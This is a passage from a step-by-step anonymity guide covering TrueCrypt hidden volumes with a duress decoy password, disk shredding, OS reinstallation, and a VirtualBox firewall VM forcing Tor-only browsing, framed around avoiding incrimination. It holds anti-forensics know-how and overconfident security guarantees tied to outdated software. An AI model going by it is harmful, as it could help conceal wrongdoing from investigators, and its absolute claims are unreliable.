games and applications during the time your SWAP isdisabled.Therefore, if you use this method, simply turn back on the SWAP when you want to use thoseram intensive applications. Also, you may choose not to take this step.Here is how to disable your swap space if you are using Windows 7:*** ADVANCED INSTRUCTIONS BELOW. SKIP THIS IF YOU ARE NOVICE ORUNCOMFORTABLE WITH THISOPERATION ****This step is recommended for advanced users only. If you are not comfortable doing this, you maysafely skip this step.*Instructions are less verbose than usual, as these steps are intended for advanced users only. If youdonot fully understand these instructions, skip this step.1. From Control Panel, go to ""System and Security"".2. Click on ""System"", and then choose ""Advanced system settings"" in the left-most menu.3. Under the ""Advanced"" tab, under ""Performance"", click ""Settings"".4. Under this ""Advanced"" tab, under ""Virtual Memory"", click ""Change""5. Uncheck ""Automatically manage paging file sizes for all drives""6. Select ""No paging file""7. Save, reboot, and follow these same first 5 steps to confirm that ""No paging file"" is still selected.Thismeans that you have successfully disabled your swap. This means that *nothing* from RAM will beinadvertently saved to your harddrive.To resume using SWAP again, simply click ""Automatically manage paging file size for all drives.""You canswitch between these two modes as you desire.Generally speaking, your computer will run fine without a swap file, provided you have enoughRAM.*** END OF ADVANCED INSTRUCTIONS ***The next issue we need to address is how to prevent applications and/or your operating system fromsaving content inadvertently that you do not want saved. For this, we are going to set up a ""VirtualMachine"".A ""Virtual Machine"" is like a computer inside of your computer. Everything you do inside theVirtualMachine (vm for short) will be fully contained within itself and no one will be able to see what thevmhas been doing. Ideally, you want *ALL* of your sensitive computer usage of any kind, TOR orNON TOR,to take place within a vm. In this way, you can keep everything private that you wish while stillusingyour computer fully and getting the most out of it.Don't be afraid of this sounds complicated. This guide will take you through every step slowly andmethodically. Before we can set up a vm however, we need to take another step.=== 4 : Setting up TrueCrypt, Encrypted Hidden Volumes ===If you save anything on your computer, it is likely that you do not want just anyone to be able to seewhat you have saved. You want a way to protect that information so that you can access it, andabsolutely no one else except those you trust. Therefore, it makes sense to set up a system whichprotects your information and safeguards it against prying eyes.The best such system for this is called ""True Crypt"". ""True Crypt"" is an encryption softwareprogramwhich allows you to store many files and directories inside of a single file on your harddrive.Further, thisfile is encrypted and no one can actually see what you have saved there unless they know yourpassword.This sounds extremely high tech, but it is actually very easy to set up. We are going to do so, rightnow:1. Go to http://www.truecrypt.org/downloads (or go to www.truecrypt.org, and click on""Downloads"")2. Under ""Latest Stable Version"", under ""Windows 7/Vista/XP/2000"", click ""Download""3. The file will be called ""True Crypt Setup 7.0a.exe"" or something similar. Run this file.4. If prompted that a program needs your permission to continue, click ""Continue"".5. Check ""I accept and agree to be bound by these license terms""6. Click ""Accept""7. Ensure that ""Install"" is selected, and click ""Next""8. click ""Install""9. You will see a dialog stating ""TrueCrypt has been successfully installed."" Click ""Ok""10. Click ""No"" when asked if you wish to view the tutorial/user's guide.11. Click ""Finish""At this point, TrueCrypt is now installed. Now we will set up truecrypt so that we can begin using ittostore sensitive information.1. Click the ""Windows Logo""/""Start"" button on the lower left corner of your screen.2. Click ""All Programs""3. Click ""TrueCrypt""4. Click the ""TrueCrypt"" applicationAnd now we can begin:1. click the button ""Create Volume""2. Ensuring that ""Create an encrypted file container"" is selected, click ""Next""3. Select ""Hidden TrueCrypt volume"" and click ""Next"".4. Ensuring that ""Normal mode"" is selected, click ""Next""5. Click on ""Select File""Note which directory you are in on your computer. Look at the top of the dialog that has opened andyou will see the path you are in, most likely the home directory for your username. An input box isprovided with a flashing cursor asking you to type in a file name. Here, you will type in thefollowingfilename:random.txtYou may of course replace random.txt with anything you like. This file is going to be created andwill beused to store many other files inside.Do NOT use a filename for a file that already exists. The idea here is that you are creating anentirelynew file.It is also recommended though not required that you ""hide"" this file somewhere less obvious. If it isinyour home directory, then someone who has access to your computer may find it easier. You canalsochoose to put this file on any other media, it doesn't have to be your hard disk. You couldfor example save your truecrypt file to a usb flash drive, an sd card, or some other media. It is up toyou.6. Once you have typed in the file name, click ""Save""7. Make sure ""Never save history"" is checked.8. Click ""Next""9. On the ""Outer Volume"" screen, click ""Next"" again.10. The default Encryption Algorithm and Hash Algorithm are fine. Click ""Next""11. Choose a file size.In order to benefit the most from this guide, you should have at least 10 gigabytes of free diskspace. Ifnot, then it is worth it for you to purchase some form of media (such as a removable harddrive, alargesd card, etc.) in order to proceed. TrueCrypt can be used on all forms of digital media not just yourharddisk. If you choose to proceed without obtaining at least ten gigabytes of disk space, then select asizethat you are comfortable with (such as 100 MB).Ideally, you want to choose enough space to work with. I recommend 20 GB at least. Rememberthat ifyou do need more space later, you can always create additional TrueCrypt volumes using exactlythesesame steps.12. Now you are prompted for a password. THIS IS VERY IMPORTANT. READ THISCAREFULLY*** READ THIS SECTION CAREFULLY ****** The password you choose here is a decoy password. That means, this is the password youwouldgive to someone under duress. Suppose that someone suspects*** that you were accessing sensitive information and they threaten to beat you or worse if you donotreveal the password. THIS is the password that you*** give to them. When you give someone this password, it will be nearly impossible for them toprovethat it is not the RIGHT password. Further, they cannot*** even know that there is a second password.Here are some tips for your password:A. Choose a password you will NEVER forget. It may be ten years from now that you need it.Make itsimple, like your birthday repeated three times.B. Make sure it seems reasonable, that it appears to be a real password. If the password issomethingstupid like ""123"" then they may not believe you.C. Remember that this is a password that you would give to someone if forced. It is *NOT* youractualpassword.D. Do not make this password too similar to what you plan to really use. You do not want someonetoguess your main password from this one.And with all of this in mind, choose your password. When you have typed it in twice, click ""Next"".13. ""Large Files"", here you are asked whether or not you plan to store files larger than 4GIGABYTES.Choose ""No"" and click ""Next""14. ""Outer Volume Format"", here you will notice some random numbers and letters next to where itsays ""Random Pool"". Go ahead and move your mouse around for a bit. This will increase therandomness and give you better encryption. After about ten seconds of this, click ""Format"".15. Depending on the file size you selected, it will take some time to finish formatting.""What is happening?""TrueCrypt is creating the file you asked it to, such as ""random.txt"". It is building a file systemcontainedentirely within that one file. This file system can be used to store files, directories, and more.Further, itis encrypting this file system in such a way that without the right password it will beimpossible for anyone to access it. To *anyone* other than you, this file will appear to be just amess ofrandom characters. No one will even know that it is a truecrypt volume.16. ""Outer Volume Contents"", click on the button called, ""Open Outer Volume""An empty folder has opened up. This is empty because you have yet to put any files into yourtruecryptvolume.*** *** DO NOT PUT ANY SENSITIVE CONTENT HERE *** ***This is the ""Decoy"". This is what someone would see if you gave them the password you used in theprevious step. This is NOT where you are going to store your sensitive data. If you have beenforced intoa situation where you had to reveal your password to some individual, then that individual will seewhatever is in this folder. You need to have data in this folder that appears to be sensitive enough tobeprotected by truecrypt in order to fool them. Here are some important tips to keep in mind:A. Do NOT use porn. Adult models can sometimes appear to be underaged, and this can cause youtoincriminate yourself unintentionally.B. Do NOT use drawings/renderings/writings of porn. In many jurisdictions, these are just as illegalasphotographs.C. Good choices for what to put here include: backups of documents, emails, financial documents,etc.D. Once you have placed files into this folder, *NEVER* place any more files in the future. Doingso maydamage your hidden content.Generally, you want to store innocent data where some individual looking at it would find no causeagainst you, and yet at the same time they would understand why you used TrueCrypt to secure thatdata.Now, go ahead and find files and store them in this folder. Be sure that you leave at least tengigabytesfree. The more the better.When you are all done copying files into this folder, close the folder by clicking the ""x"" in the toprightcorner.17. click ""Next""18. If prompted that ""A program needs your permission to continue"", click ""Continue""19. ""Hidden Volume"", click ""Next""20. The default encryption and hash algorithms are fine, click ""Next""21. ""Hidden Volume Size"", the maximum available space is indicated in bold below the text box.Rounddown to the nearest full unit. For example, if 19.97 GBis available, select 19 GB. If 12.0 GB are available, select 11 GB.22. If a warning dialog comes up, asking ""Are you sure you wish to continue"", select ""Yes""23. ""Hidden Volume Password""*** IMPORTANT READ THIS ***Here you are going to select the REAL password. This is the password you will NEVER reveal toANYONEelse under any circumstances. Only you will know it. No onewill be able to figure it out or even know that there is a second password. Be aware that anindividualintent on obtaining your sensitive information may lie to you and claim to be able to figure this out.They cannot.It is HIGHLY recommended that you choose a 64 character password here. If it is difficult toremember a64 character password, choose an 8 character password and simply repeat it 8 times. A datenaturallyhas exactly 8 numbers, and a significant date in your life repeated 8 times would do just fine.24. Type in your password twice, and click ""Next""25. ""Large Files"", select ""Yes"" and click ""Next"".26. ""Hidden Volume Format"", as before move your mouse around for about ten seconds randomly,andtehn click ""Format"".27. If prompted ""A program needs your permission to continue"", select ""Continue""28. A dialog will come up telling you that the hidden TrueCrypt volume has been successfullycreated.Click ""Ok""29. Click ""Exit""Congratulations! You have just set up an encrypted file container on your hard drive. Anything youstorehere will be inaccessible to anyone except you. Further, you have protected this content with TWOpasswords. One that you will give to someone under threat, and one that only you will know. Keepyourreal password well protected and never write it down or give it to anyone else for any reason.Now, we should test BOTH passwords.=== 5. Testing TrueCrypt Volumes ===Once you have completed the above section, you will be back at TrueCrypt. Go ahead and followthesesteps to test the volumes you have made.1. Click ""Select File...""2. Locate the file you created in the last section, most likely called ""random.txt"" or somethingsimilar.Remember that even though there is both an outer anda hidden volume, both volumes are contained in a single file. There are not two files, only one.3. Click ""Open""4. Choose a drive letter that you are not using (anything past M is probably just fine). Click on that,Forexample click on ""O:"" to highlight it.5. Click ""Mount""6. Now you are prompted for a password. Read the below carefully:The password you provide here will determine WHICH volume is mounted to the drive letter youspecified. If you type in your decoy password, then O:\ will show all the files and directories youcopiedthat you would reveal if forced. If you type in your real password, then O:\ will show the files anddirectories that you never intend anyone to see.7. After successfully typing in your password, you will see additional detail to the right of the driveletter,including the full path to the file you selected as well as the kind of volume it is (for example,hidden).8. Right click on your ""Windows Logo""/""Start Menu"" icon, and scroll down to the bottom whereyou cansee your different drive letters. You will see the drive letter you selected, for example: ""Local Disk(O:)"".Click on that.9. If you selected your decoy password, you will see all the files and folders that you moved thereduringthe installation phase. If you selected the real password, you will see whatever files and directoriesyouhave placed so far into the hidden volume, if any.If you selected your hidden volume password, you may now begin moving any sensitiveinformation youwish. Be aware that simply moving it from your main hard disk is not enough. We will discuss howtoensure deleted data is actually deleted later in the guide.""What is happening?""When you select a file and mount it to a drive, you are telling your computer that you have a newdrivewith files and folders on it. It is the same thing as if you had plugged in a usb flash drive, aremovableharddrive, or an sd card into your computer. TrueCrypt causes your computer to think that there isanentirely new disk drive on your computer. You can use this disk drive just as if it *was* actually ausbflash drive. You can copy files to it, directories, and use it just as you would use a usb flash drive.When you are done, simply close all open windows/folders/applications that are using yourtruecryptdrive letter, and then click ""Dismount"" from within TrueCrypt while you have the drive letterhighlighted. This will once again hide all of this data, accessible only by re-mounting it with thecorrectpassword.*** VERY IMPORTANT SAFETY INFORMATION ***When a true crypt hidden volume is mounted, someone who has access to your computer can accessanything that is inside that hidden volume. If for example you left your computer running while atruecrypt volume was mounted, then if someone gained access to your computer they would be abletosee everything you have in that volume. Therefore:*** ALWAYS REMEMBER TO DISMOUNT ANY TRUECRYPT VOLUME CONTAININGANY SENSITIVEINFORMATION WHEN YOU ARE NOT USING YOUR COMPUTER ***You can tell that it is dismounted because the drive letter inside of ""TrueCrypt""'s control panel willappear the same as all of the other drive letters, with no information to the right of the drive letter.You should practice Mounting and Dismounting a few times with both passwords to make sure youunderstand this process.Once you have copied files/folders into the hidden volume, do *NOT* touch the files or folders intheouter volume anymore. Remember that both volumes occupy the same single file, and thereforechanging the outer volume can damage the hidden volume. Once you have copied files/folders intotheouter volume during the installation process, that is the last time you should do so. From that pointforward, use ONLY the hidden volume. The outer volume exists only as a decoy if you need it.=== 6. Securing your Disk ===This is an involved step which many people may not be able to do right away. If you cannot do thisstepimmediately, then see section 7.At this point you should understand how to create and use TrueCrypt hidden volumes in order tosafeguard any sensitive information. Therefore, you should *NOT* keep any such sensitiveinformationon your hard disk. At this stage, there are two possibilities:1. You have never had any sensitive information on your hard disk. In this case, read this section butyoucan certainly skip it.2. Up until now, you have stored sensitive information on your hard disk. If so, then you MUSTread thissection.If you have ever used this computer to access sensitive information, then all of the security andprecautions in the world are totally useless and futile because all someone has to do is access whatisleft of that sensitive information. I cannot stress this enough.You can have the most secure TrueCrypt volumes, use TOR, and be the safest most secure user intheworld. If you have not made sure that *ALL* remnants of any sensitive information are UTTERLYREMOVED from your hard disk, then all of that effort is totally pointless. You MUST take theseactions tosafeguard your hard disk, or otherwise you might as well throw away this guide and follow none oftheadvice herein.First, I understand that it is troublesome to have to re-format a computer, to back everything up, andreinstall everything. However, if you have ever had sensitive information on your machine, that iswhatyou have to do. Take the following steps:1. Obtain a removable harddrive or usb flash drive large enough to store anything you need to save.2. Set up a truecrypt hidden volume on that harddrive big enough to hold all of that information.3. Set up the truecrypt outer volume as in the previous section. Use the previous section as a guideifyou need to.4. Be sure you the hidden volume will have enough space to store all that you are backing up.5. Copy ALL data you need to back up/save into that hidden volume.*** IMPORTANT, READ THIS ***If you have ever used this system to access sensitive information, then you must assume that thesensitive information or remnants of it can be *anywhere* on your hard disk. Therefore, you needtomove *EVERYTHING* you intend to save into the hidden truecrypt container. You do not knowwheresensitive data might be, so you are assuming it can be anywhere. This way you still have ALL ofyour dataand you have lost nothing.A good analogy is toxic waste. You don't know which barrel might contain the toxic waste, so youtreat*ALL* the barrels as potentially toxic. This is the surest way you can protect yourself.You might be saying, ""I have family photos, music, movies that I would have to move to the hiddenvolume."" That is perfectly fine. Remember that you can access that hidden volume just as if it was adrive letter. In fact, ideally, *ALL* of the content on your computer (assuming you value yourprivacy)should be protected anyways. You lose nothing by securing all of that data.6. Once you have copied everything you intend to copy. dismount your hidden volume, reboot yourcomputer, and re-mount your hidden volume to make sure everything is there.7. Now it is time to re-format your entire hard drive. Re-install your operating system of choice(such asWindows 7), and start with a clean slate.8. Once you have reinstalled your operating system from scratch, follow sections one through fiveof thisguide to reach this point, and then proceed.=== 7. Temporarily Securing Your Disk, Shredding Free Space ===Like the previous section, this section applies ONLY IF there is some risk that sensitive data haseverbeen stored or accessed on this computer. If you are 100% sure that sensitive information has neverbeen accessed using this computer, then you can safely skip this and the previous step.If you are not prepared to take the actions in the previous step yet, then you should follow the stepsinthis section until you can. However, you MUST eventually take the actions in step six above. Donotassume you can find/delete all sensitive content. Lists of filenames, image thumbnails, randomdata, and more *ARE* sitting on your hard disk. Someone who knows how to find it, WILL. Thatwillrender all of your other precautions totally futile.As soon as you can, follow the instructions in step six.Meanwhile, here is how you can temporarily safeguard yourself until you are able to follow thoseinstructions.1. Go through your hard disk folder by folder, deleting (or moving to a truecrypt hidden volume)anyfiles that you believe are sensitive/risky.2. When you are totally sure that you have deleted all such files, go to the following URL:http://www.fileshredder.org3. Scroll down and look for the button called ""Download File Shredder"" -- do NOT click any otherbutton,as the page may have ads on it that appear to be download links.4. Save the file.5. Run the file, most likely titled: file_shredder_setup.exe6. ""Welcome to the File Shredder Setup Wizard"", Click ""Next""7. Select ""I accept the agreement"" and click ""Next""8. It will choose where to install it, click ""Next""9. Click ""Next"" again when prompted for the Start Menu folder.10. ""Select Additional Tasks"", Click ""Next"" again11. Click ""Install""12. Ensuring that ""Launch File Shredder"" is checked, click ""Finish""13. You should now notice that ""File Shredder"" is running. You should see the program in your taskbar.Click on it to bring up the control panel if it is not up already.14. On the left is a link that says ""Shred Free Disk Space"", click it.15. Choose the drive letter for your hard disk, typically C:\, as well as any other drives you wish toshredthe free space.16. under ""Select Secure Algorithm"", select ""Secure Erasing Algorithm with 7 passes"" and click""Next""17. Click ""Start""This will take some time to finish. Once you have finished shredding your free disk space, it will beimpossible or nearly impossible for someone to find one of your deleted files and piece it backtogetherto see what it once was. However, this is NOT enough.Keep in mind that there may still be records of the filenames that were deleted, partial data fromthosefiles, image thumbnails, and more that may be enough to incriminate you. This is only a temporarystepyou have taken, and you absolutely must take the actions in step 6 above in order to be truly safe.=== 8. Installing VirtualBoxAnd now we get to the fun part. We are going to create a secure environment for you to browse theinternet and communicate in a way that is totally anonymous and untraceable. You will have a setupthat is so secure as to be virtually impossible to break.1. First, go to the following URL: http://www.virtualbox.org2. Select ""Downloads"" in the menu on the left3. Under ""VirtualBox platform packages"" is ""VirtualBox 4.0.4 for Windows Hosts"", next to that is""x86/amd64"". Click that.4. Save the file. It should be titled similar to: ""VirtualBox-4.0.4-7011-Win.exe5. Run the file.6. ""Welcome to the Oracle VM... Setup Wizard"", Click ""Next""7. click ""Next""8. Click ""Next""9. ""Warning: Network Interfaces"", click ""Yes"" but be aware that your internet connection will betemporarily reset for a few seconds.10. Click ""Install""11. A dialog saying ""A program needs your permission to continue"" may appear, click ""Continue"".12. One or more dialogs asking if you want to install ""device software"" may come up, select""Install""each time.13. Optionally check the box ""Always trust software from Oracle Corporation.""14. ""Oracle VM... installation is complete"", Click ""Finish"" ensuring that ""Start Oracle VM afterinstallation"" is checked.Now we have the software we need in order to set up and run virtual machines. On your task bar tothefar right, you should notice VirtualBox running. Click on the ""VirtualBox"" icon if needed in order tobringthe VirtualBox control panel into view.Now it is time to set up a virtual machine. For this, we need to obtain two files. Operating systems,suchas windows, are typically installed using a cd or dvd. You put the cd or dvd into your computer, youbootit up, and you follow the instructions in order to install the operating system. Virtual machineswork similarly. Before we can use a virtual machine, we have to install an operating system on it.However, we are *NOT* going to use Windows! We are going to use Linux. Do not be afraid if youhaveno experience using Linux. I assure you that this will prove to be painless. We actually need twodifferent linux operating systems in order to have a secure system. Before we go through the stepsofsetting this up, I want to describe to you what we are doing.Remember earlier in the guide I explained that one of the downsides to using Tor Browser fromyourmain computer is that you might accidentally put a link into a non-Tor browser. The problem withyourcomputer right now is that you can access tor sites, or non-tor sites equally well. That means thatyouhave to be extremely careful to ensure that you are using Tor.An analogy would be to say that you are typing on a keyboard with red and green keys. You have tobecareful to only hit the green keys. If you accidentally hit a red key, then you could compromise yoursecurity and anonymity. That is *not* a good position to be in. The purpose of setting up a virtualmachine is to make certain that you cannot accidentally reveal your identity or compromise yoursecurity.The computer you are using now has two ways of accessing the internet: TOR, and Non-TOR. Thevirtualmachine we are setting up however will only be able to access the internet using TOR. No otherwayperiod. That means that no matter what you do, no matter how hard you try, you will NOT be abletoaccidentally access any website except through TOR. This *guarantees* that whatever you do onthatvirtual machine is going to be through TOR.So how do we achieve this? There are a number of ways to do so. The method presented in thisguide isnot the only good way, however I do believe that it is both easy to set up and also friendly to userswhomay not have a great deal of RAM.First, we are going to set up two different virtual machines. One of them will exist for the solepurposeof making sure that the other one does not accidentally connect to the internet except through TOR.This virtual machine requires very little. You will not be using it for anything. It will simply act as agatekeeper to ensure that the other Virtual Machine is safe.The second virtual machine will be what you use for internet browsing, chatting, etc. This virtualmachine will be configured in such a way that it can only use TOR and nothing else. The way wewillachieve this is to force this second virtual machine to go through the first virtual machine for allinternetconnections.Do not worry if this seems complicated. As with the rest of this guide, I am going to walk youthroughstep by step exactly what to do.First, we have to obtain the operating systems we will need. In this case, we are going to use ""DamnSmall Linux"" (yes that is it's real name) for the firewall and we are going to use ""Ubuntu"" for themainsystem. The advantage to using ""Damn Small Linux"" is that we only need 32 MB of ram and nodisksapce to have an effectivefirewall.Let's set up the firewall first:=== 9. Installing a Firewall ===1. First, go to the following URL: http://www.damnsmalllinux.org (three l's)2. Scroll down until you see a link that says ""Download""3. Under ""Current Full Mirror List"", click any that work. Some may not work at any given time. Ifonedoesn't work, simply hit back on your browser and try another one.4. At the time of this guide, the following url worked:ftp://ftp.is.co.za/linux/distributions/ â¦ l/current/5. Go to the ""current"" directory if not already in it.6. Click on the file called: dsl-4.4.10.iso -- If you cannot find this file, choose the file closet to it. Ahigherversion number is fine. The file will probably be about 50 MB7. The file should take about 5-10 minutes to download based on your connection.( IF THE ABOVE STEPS WORKED FOR YOU, SKIP THIS MINI-SECTION(( If you had trouble with the above steps, read this mini-section(( With mirrors, it is often the case that a particular mirror site doesn't work. At the time of thiswriting,several mirrors worked. I am providing( detailed instructions for each mirror.(( Above I have already provided instructions for the mirror ftp://ftp.is.co.za(( MIRROR: http://gd.tuwien.ac.at/opsys/linux/damnsmall(( Go to this URL, and under ""Subdirectories"" click on ""current""( if available, select the file called ""current.iso"" (provided the file is at least 49 MB in size)( If not, then choose the closest file to dsl-4.4.10.iso, a higher version # is fine.(( MIRROR: http://ftp.belnet.be/packages/damnsmalllinux/(( go to ""current"" directory, obtain either ""current.iso"" (if 49 MB or higher) or find file closest to""dsl-4.4.10.iso"")(( MIRROR: http://ftp.heanet.ie/mirrors/damnsmalllinux.org/(( go to ""current"" directory, obtain either ""current.iso"" (if 49 MB or higher) or find file closest to""dsl-4.4.10.iso"")( MIRROR: http://ftp.heanet.ie/mirrors/damnsmalllinux.org/(( go to ""current"" directory, obtain either ""current.iso"" (if 49 MB or higher) or find file closest to""dsl-4.4.10.iso"")At this point, you should have the file either ""current.iso"" or ""dsl-4.4.10.iso"" (or something similar)fullydownloaded and saved into your Downloads directory.Now, go ahead and open up VirtualBox again, most likely by clicking it on the task bar.8. Click ""New"" at the top left, an icon that resembles a many-pointed round star.9. ""Welcome to the New Virtual Machine Wizard"", click ""Next""10. ""VM Name and OS Type"": Under ""Name"" type in: Firewall11. For Operating System, choose ""Linux""12. For ""Version"", choose: ""Other Linux""13. Click ""Next""14. ""Memory"", select ""32 MB"" and click Next15. ""Virtual Hard Disk"", Uncheck ""Boot Hard Disk"" and click ""Next""16. If a Warning dialog appears, click ""Continue""17. Click ""Finish""18. Now you will notice ""Firewall, Powered Off"" visible in your VirtualBox control panel. Makesure it ishighlighted (it should be) and then right click it, and select ""Settings"".19. Select ""Network"" in the menu to the left.20. Click on the ""Adapter 2"" tab.21. Check ""Enable Network Adapter"" and next to where it says ""Attached to"", select ""InternalNetwork""from the pulldown menu.22. Click ""Ok"" at the bottom.23. Once again, right click ""Firewall, Powered Off"" and select ""Start""24. Check ""Do not show this message again"" and click ""Ok"". This is just letting you know that the""RIGHTCTRL KEY"" on your keyboard is the ""control"" key for this virtual machine.25. ""Welcome to the First Run Wizard"", click ""Next""26. ""Select Installation Media"", under ""Media Source"" is a pull down menu. To the immediate rightofthat pull down menu is an icon with a folder. Click that folder icon.27. Locate ""current.iso"" or ""dsl-4.4.10.iso"" (or the similar file name) that you downloaded. Whenlocated, click ""Open"". It is likely in the ""Downloads"" directory of your home folder.28. Click ""Next""29. Click ""Finish""Now the virtual machine will start to boot up. Simply wait... (This may take up to 5 minutes.)30. One or more new dialogs may come up saying ""VirtualBox Information"", just click ""Do notshow thismessage again"" and click ""Ok""After a few minutes, the booting will finish and you will be looking at the desktop for your firewallvirtualmachine. To the right of the window you will see some stats that look something like this:Up: 0 k/s - Down: 0 k/sProcesses: 19CPU Usage: 10%RAM Usage: 16.2MB/28.8MBetc.Congratulations! You now have a firewall running. Now we will set up this firewall to protect youso thatyou can safely use TOR from your main virtual machine.=== 10. Firewall Configuration ===At this stage you should be looking at the desktop for ""DSL"" (Damn Small Linux).I need to talk about the mouse first. This particular virtual machine as well as your main operatingsystem (windows) both want control of your mouse. Both cannot have control of your mouse at thesame time however. Therefore, you have to choose whether the mouse will be used by your virtualmachine, or by Windows. When you click into your virtual machine, it has the effect of passingcontrol ofthe mouse to the virtual machine. That means you cannot move your mouse cursor past theboundariesof that virtual machine.In order to give mouse control back to windows, enabling you to move your mouse cursoranywhere,simply press the right ctrl key on your keyboard. That is to say, you have two ctrl keys. One on theleft ofyour keyboard, and one on the right. Press the ctrl key that is on the right of your keyboard. Thiswill give mouse control back to windows.Practice this a bit. Practice clicking into the window, moving the mouse cursor around, pressingrightctrl, and moving the windows mouse cursor around. Get the feel of it.You should see a window that looks something like a web browser, with some text in it includingwordssuch as ""Getting Started with DSL"". First, close that window.( If your mouse is not working, read this mini-section.(( First, click inside the window that your virtual machine is running in. Now try moving your mousecursor. If you do not see the mouse cursor moving around, then press( RIGHT CTRL + I. Now move your mouse cursor again. If you notice that you are moving your""main""mouse cursor over the window, but you do not see the ""DSL"" black mouse( cursor moving, then click again into that window. If you do this a few times, you should noticethat themouse begins to work. You may have to press RIGHT CTRL+I a couple( of times to get the mouse to work.1. Once the mouse is working inside of your virtual machine, go ahead and close the windowentitled""Getting Started with DSL""( If you cannot see the full virtual machine window, for example because your screen resolution isset sothat some of the window goes too low, read this mini-section.(( First, press RIGHT CTRL+I until you have your main windows white mouse cursor back. Now,click on""Machine"" in the menu at the top of the window.( Select ""Switch to Scale Mode""(( Click ""Switch""( Now you will have converted your firewall window to a smaller size, and you will be able toresize it.You may need to press ""right ctrl"" to get a windows mouse cursor( which you will need in order to resize this window. Now simply resize it to the size that works foryou,and then click into the window to be able to use the black mouse( cursor inside the virtual machine. I recommend you maximize this window to make sure you canreadeverything clearly.2. Right click anywhere on the desktop, go to System (a red folder), go to Daemons, ssh, and start.3. Right click again anywhere on the desktop, go to XShells -> Root Access -> Transparent4. Now you have a window that you can type in. Type exactly as shown below into this window,and hitenter:passwdOnce you type this and hit enter, it will ask you for a password. This is a password for full access tothefirewall. Make it at least 8 characters in size.*** IMPORTANT: Do not forget your firewall password. You will need it later in the guide. ***When you have successfully changed your password, it will say ""Password changed.""5. Now type exactly as shown below, into the same window:ifconfig eth1 10.0.3.16. It will not say anything after you hit enter, it will just return you back to the prompt.Now our firewall server is ready. We want to save this state so that we can get back to it easy in thefuture.Press RIGHT CTRL+S7. Now you will be looking at a window that says ""Take Snapshot of Virtual Machine"". Just click""Ok""8. Now, let's test this out to confirm it works as we expect. Go ahead and close the virtual machinebyclicking the ""X"" in the top right corner. A menu will come up. Select ""Power off the machine"" andclickok. Do NOT check the box called ""Restore current snapshot"".And now you should be once again at the VirtualBox manager. You will see ""Firewall(Shapshot 1),Powered Off""9. Make sure that ""Firewall (Snapshot 1), Powered Off"" is selected. At the top right of yourVirtualBoxManager is a button that says: ""Snapshots (1)"". Click it.10. Click on ""Snapshot 1"", the top-most selection. This will highlight it.11. Now right click it, and click on ""Restore Snapshot""12. A dialog box will come up asking if you are sure, click ""Restore""13. Now click the ""Start"" button at the top with the large green arrow.14. Any dialog boxes that come up with a check box saying ""Do not show this information again"",simplycheck the check-box, and click ok. Do not worry about any of those.Remember, if you do not have immediate control of the mouse inside the virtual machine, simplypressRCTRL+I (press right ctrl and ""I"" at the same time) and click into it until you have mouse control.Now your firewall is good to go. Any time you need it, just go to the VirtualBox Manager andfollowsteps 9 through 14 above. You do not have to go through the whole setup process again at any timeinthe future. Your firewall is ready.=== 11. Installing Ubuntu ===Now we are going to set up the main machine that you will be using TOR with.1. First, go to this URL: http://www.ubuntu.com2. Click on the link ""Download Ubuntu""3. Click ""Start Download"" (This download should take 10-15 minutes)4. The filename is going to be similar to: ubuntu-10.10-desktop-i386.isoNow we wait...While you are waiting for the file to download, go ahead and make sure that your ""hidden volume""ismounted in TrueCrypt to a particular drive letter. For example, O: You will need that for the nextstep.5. Return to your ""VirtualBox Manager"". It doesn't matter if the firewall is running or not.6. Click ""New"" (the blue round star-icon in the top left) again.7. ""Welcome to the New Virtual Machine Wizard"", click ""Next""8. ""VM Name and OS Type"", under ""Name"", type ""Primary""9. Next to ""Operating System"", select ""Linux""10. Next to ""Version"", select ""Ubuntu"" and Click ""Next""11. ""Memory"", by default it selects 512 MB. This is fine. 256 MB is the MINIMUM. The morememoryyou allocate, the better the virtual machine will function. Click ""Next""12. ""Virtual Hard Disk"", Make sure ""Boot Hard Disk"" is checked. Make sure ""Create new harddisk"" isselected. Click ""Next""13. ""Welcome to the Create New Virtual Disk Wizard"", click ""Next""14. ""Hard Disk Storage Type"", select ""Fixed-size storage"" and click ""Next""15. ""Virtual Disk Location and Size"", to the right of the text box containing ""Primary"" is a foldericon.Click the folder icon.16. Now we have to select a file for the new hard disk image file. On the bottom of this dialog itsays""Browse Folders"", click on that.17. Now click on ""Computer"" in the menu to the left.18. Scroll to where you see the drive letter you mounted, and double click on it. Ex: Local Disk (O:)19. Now click ""Save""20. By default 8.00 GB are selected. That is fine. If you have enough space on your hidden volume,increase this to 10 GB. Otherwise, 8 is fine.21. Under ""Location"", it should say O:\Primary.vdi where O: is replaced by whatever drive letteryoumounted your TrueCrypt hidden volume to.22. Click ""Next"", then click ""Finish""Now we wait for VirtualBox to create the hard drive we asked for. This may take a few minutes.Keep in mind this entire virtual machine as well as any of its contents are going to reside within thehidden truecrypt container. This ensures extra security.23. When this is done, you will see a ""Summary"" window. Click ""Finish"".24. Now, right click on ""Primary, Powered Off"" in your ""VirtualBox Manager"", and click ""Start""25. Again we are at the ""First Run Wizard"", click ""Next""26. ""Select Installation Media"", under ""Media Source"" is a pull down menu. Click the ""folder icon""to theimmediate right of that pulldown menu.27. Locate ""ubuntu-10.10-desktop-i386"" (or the similarly named file) from your Downloadsdirectory, orwherever you saved it. Click on it, and click ""Open""28. Click ""Next""29. Click ""Finish""Now simply wait. Your Ubuntu virtual machine will be loading up. This may take a few minutes.Don'tworry if you see all kinds of strange messages/text. It is normal.After a few minutes, you should start to see the Ubuntu desktop load. Unlike your firewall, you willnotice that you do not have to click the mouse inside the window. It automatically happens. This isgoingto be much easier than the ""Firewall"" step.Once everything has loaded, you will be looking at a window that says ""Install"" with a button thatsays""Install Ubuntu"". If you cannot see everything, press RCTRL+F (to go full screen). You can returntowindowed mode by RCTRL+F again. Any dialogs can be closed, and you can check the box thatsays ""Donot show me this again.""30. Click ""Install Ubuntu""31. Check ""Download updates while installing""32. Check ""Install this third-party software"". Click ""Forward""33. Ensure ""Erase and use entire disk"" is selected, and click ""Forward"". Remember, this is NOTtalkingabout your hard disk. It is talking about the 8-10 gigabyte virtual disk.34. Click ""Install Now""35. Now you will be guided through a series of installation related screens. The first screen asks youtoselect your timezone/time. Select your choice and click ""Forward""36. Now keyboard layout, again select your choice and click Forward. If you are unsure, leave it asis orclick ""Figure out keyboard layout""37. ""Who are you?"" For ""Your name"" type in: mainuser38. When you type in ""mainuser"" the other boxes will fill in automatically. Now click in the textbox nextto ""Choose a password"".39. Do NOT use the same password as the firewall. Come up with a different password.40. Ensure that ""Require my password to log in"" as well as ""Encrypt my home folder"" are selectedandchecked and proceed.Now simply wait until the installation is finished. The installation may take a while, and it 